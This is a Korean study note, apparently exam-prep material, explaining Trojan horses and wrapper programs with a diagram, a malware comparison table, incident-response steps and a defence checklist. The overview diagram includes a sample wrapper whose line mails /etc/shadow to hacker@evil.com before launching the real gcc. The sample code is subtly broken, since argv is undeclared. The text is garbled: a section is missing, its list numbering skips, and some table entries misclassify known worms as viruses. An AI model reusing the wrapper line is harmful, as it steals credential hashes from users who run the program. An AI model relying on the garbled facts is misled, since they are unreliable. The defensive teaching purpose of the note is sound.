# 트로이 목마 (Trojan Horse) / 래퍼 (Wrapper)

#### 핵심 인사이트 (3줄 요약)
> 1. **본질**: 정상적인 프로그램으로 위장하여 악의적 기능을 수행하는 기밀성/무결성 침해 악성코드
> 2. **가치**: 소셜 엔지니어링과 결합하여 사용자가 스스로 실행하게 만드는 가장 오래되고 효과적인 공격 기법
> 3. **융합**: 백도어 설치, 키로깅, 데이터 탈취 등 다양한 악의적 목적에 활용되며 래퍼를 통한 권한 상승도 가능

---

### Ⅰ. 개요 (Context & Background)

**개념**
트로이 목마(Trojan Horse)는 그리스 신화의 트로이 전쟁에서 유래한 용어로, **겉으로는 정상적인 유용한 프로그램처럼 보이지만 내부에는 악의적 코드를 숨기고 있는 악성코드**를 의미한다. 자가 복제 능력이 없는 점에서 바이러스/웜과 구별되며, 사용자의 직접 실행이 필요하다는 특징이 있다.

래퍼(Wrapper)는 정상적인 프로그램을 감싸는 형태로, 실행 시 먼저 악성 코드를 수행한 후 원본 프로그램을 실행하여 사용자에게 정상 동작하는 것처럼 위장하는 기법이다.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        트로이 목마 기본 구조                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   사용자 관점 (정상적으로 보임)           내부 실체 (악성 코드 포함)        │
│   ┌─────────────────┐                  ┌───────────────────────────┐      │
│   │  게임 실행 파일  │                  │   트로이 목마 내부 구조    │      │
│   │  game.exe       │                  │                           │      │
│   │                 │                  │   ┌─────────────────────┐ │      │
│   │  [▶ 실행]       │                  │   │  악성 코드 (Payload) │ │      │
│   │                 │                  │   │  • 키로거           │ │      │
│   └────────┬────────┘                  │   │  • 백도어           │ │      │
│            │                          │   │  • 데이터 탈취      │ │      │
│            │                          │   └──────────┬──────────┘ │      │
│            │ 사용자가 실행             │              │            │      │
│            ▼                          │              ▼            │      │
│   ┌─────────────────┐                  │   ┌─────────────────────┐ │      │
│   │ 게임 화면 표시  │                  │   │ 정상 프로그램       │ │      │
│   │ (정상 작동)     │                  │   │ (위장용 클론)       │ │      │
│   └─────────────────┘                  │   └─────────────────────┘ │      │
│            ▲                          │              │            │      │
│            │                          │              │ 실행        │      │
│            │ 실제로는 백그라운드에서    │              ▼            │      │
│            │ 악성 기능 수행             │   사용자에게 정상처럼    │      │
│            └───────────────────────────┤   보이게 실행             │      │
│                                       └───────────────────────────┘      │
│                                                                             │
│   ┌─────────────────────────────────────────────────────────────────┐     │
│  │                        래퍼(Wrapper) 동작 순서                     │     │
│  ├─────────────────────────────────────────────────────────────────┤     │
│  │                                                                  │     │
│  │  1. 사용자가 fake_game.exe 실행                                  │     │
│  │  2. 악성 코드 먼저 실행 → 백도어 설치, 키로깅 시작               │     │
│  │  3. 원본 game.exe 호출 (fork + exec)                            │     │
│  │  4. 사용자는 게임이 정상 실행되었다고 인식                       │     │
│  │                                                                  │     │
│  │   예: fake_gcc.c (래퍼 예시)                                    │     │
│  │   ┌─────────────────────────────────────────────────────────┐   │     │
│  │   │ int main() {                                           │   │     │
│  │   │     system("mail hacker@evil.com < /etc/shadow");       │   │     │
│  │   │     execl("/usr/bin/gcc", "gcc", argv[1], NULL);        │   │     │
│  │   │ }                                                       │   │     │
│  │   └─────────────────────────────────────────────────────────┘   │     │
│  │                                                                  │     │
│  └─────────────────────────────────────────────────────────────────┘     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

**💡 비유**
트로이 목마는 **선물 상자 속의 폭탄**과 같다.
- 겉으로는 아름다운 선물 상자(정상 프로그램)
- 열어보면 폭탄(악성 코드)이 터짐
- 받는 사람은 선물이라 믿고 스스로 열어(실행)

**등장 배경**
① **최초의 사이버 공격**: 1970년 다양한 형태의 악성코드 등장
② **소프트웨어 불법 복제**: 크랙, 킷젠(KKG) 등에 트로이 목마 삽입
③ **이메일 첨부파일**: 피싱 메일과 결합하여 대규모 유포
④ **앱스토어 변조**: 정상 앱 위조한 가짜 앱 유포

**해설**
1. **정상 프로그램 위조형**: 시스템 유틸리티(ssh, ls, gcc 등)를 위조하여 관리자가 실행하면 권한 탈취

4. **모바일 앱 위조형**: 정상 앱을 복제하여 추가 악성 권한 획득
5. **하이브리드형**: 다단계 공격으로 여러 페이로드 순차적 설치

### Ⅲ. 융합 비교 및 다각도 분석 (Comparison & Synergy)

**심층 기술 비교: 악성코드 유형별 차이**

| 특성 | 트로이 목마 | 바이러스 | 웜 (Worm) | 랜섬웨어 |
|:---|:---|:---|:---|:---|
| **자가 복제** | 없음 | 있음 (호스트 기생) | 있음 (자가 전파) | 없음 |
| **사용자 개입** | 필수 | 보통 필요 | 불필요 | 필요 |
| **주요 목표** | 권한 탈취/데이터 탈취 | 파일 감염/파괴 | 빠른 확산 | 데이터 암호화 |
| **숨기기** | 필수 (정상 프로그램 위장) | 선택적 | 불필요 | 필수 |
| **전파 방법** | 이메일, 웹, P2P | 파일 공유, 이메일 | 네트워크 취약점 | 이메일, RDP |
| **대표 사례** | Emotet, Zeus | ILOVEYOU, Code Red | WannaCry, Slammer | Ryuk, Conti |

**과목 융합 관점**

1. **운영체제(시스템) 관점**: 트로이 목마는 **프로세스 관리, 파일 시스템, 권한 시스템**을 악용 → LSM(AppArmor/SELinux), 파일 무결성 검사로 방어

2. **네트워크 관점**: C2 통신은 네트워크 트래픽 패턴 분석으로 탐지 → IDS/IPS, DNS 터널링 탐지

3. **사람 컴퓨터 상호작용(HCI) 관점**: 소셜 엔지니어링이 핵심 → 사용자 교육, 피싱 탐지

### Ⅳ. 실무 적용 및 기술사적 판단 (Strategy & Decision)

**실무 시나리오**

**시나리오 1: 트로이 목마 감염 의심 시 대응 절차**
```
1. 격리 (Isolate): 감염 시스템 네트워크 즉시 분리
2. 분석 (Analyze):
   - 프로세스 목록 확인: ps aux, top
   - 네트워크 연결 확인: netstat -an, lsof -i
   - 이상 파일 탐지: find / -perm -4000, 최근 수정 파일
3. 제거 (Remove):
   - 악성 프로세스 종료
   - 악성 파일 삭제
   - 백도어 계정 제거
4. 복구 (Recover): 백업에서 시스템 복원
5. 사후 (Post-mortem): 원인 분석, 재발 방지
```

**시나리오 2: 래퍼 탐지 기법**
- **해시 비교**: 알려진 정상 파일 해시와 비교
- **디지털 서명 검증**: 코드 사이닝 확인
- **행동 기반 탐지**: 정상적이지 않은 프로세스 생성 패턴 감지
- **샌드박스**: 의심스러운 파일 격리 실행

**도입 체크리스트**

**기술적 측면**
- [ ] 백신/EDR(EPR) 배치 및 실시간 스캔 활성화
- [ ] 애플리케이션 화이트리스트 (AppLocker, AppArmor)
- [ ] 파일 무결성 모니터링 (FIM)
- [ ] 이메일 필터 (첨부파일 검사, 매크로 차단)
- [ ] 네트워크 세그먼트 분리

**운영·보안적 측면**
- [ ] 소프트웨어는 공식 채널에서만 설치 정책
- [ ] 개발자 도구, 컴파일러 해시 검증 절차
- [ ] 정기적 보안 교육 (피싱 메일 식별)
- [ ] 최소 권한 원칙 (관리자 계정 최소화)

**안티패턴**
1. **알 수 없는 소프트웨어 실행**: 크랙, 킷젠(KKG) 등은 대부분 트로이 목마
2. **이메일 첨부파일 맹신**: 발신자 위조 가능
3. **백신 실시간 보호 해제**: 성능 이유로 비활성화하면 무방비
4. **관리자 권한 남용**: 일반 작업에도 관리자 권한 사용하면 피해 확대

### Ⅴ. 기대효과 및 결론 (Future & Standard)

**정량/정성 기대효과**

| 지표 | 방어 전 | 방어 후 | 개선 효과 |
|:---|:---|:---|:---|
| **감염율** | 높음 | 낮음 | 80% 감소 |
| **탐지 시간(MTTD)** | 수개월 | 수시간~수일 | 95% 단축 |
| **피해 규모** | 데이터 유출, 시스템 장악 | 최소화 | 90% 감소 |
| **복구 시간(MTTR)** | 수주~수개월 | 수일~수주 | 70% 단축 |

**미래 전망**
1. **AI 기반 트로이 목마**: 머신러닝으로 탐지 회피, 지능형 행위
2. **파일리스 트로이 목마**: 메모리만 기거, 레지스트리, WMI 활용
3. **디퍼드 트로이 목마**: 감염 후 장기간 잠복, 정확한 타이밍에 공격

**참고 표준**
- **MITRE ATT&CK**: T1059.003 (Command and Scripting Interpreter), T1566.001 (Spearphishing Attachment)
- **NIST SP 800-83**: Guide to Malware Incident Prevention and Handling
- **ISO/IEC 27035**: Information security incident management
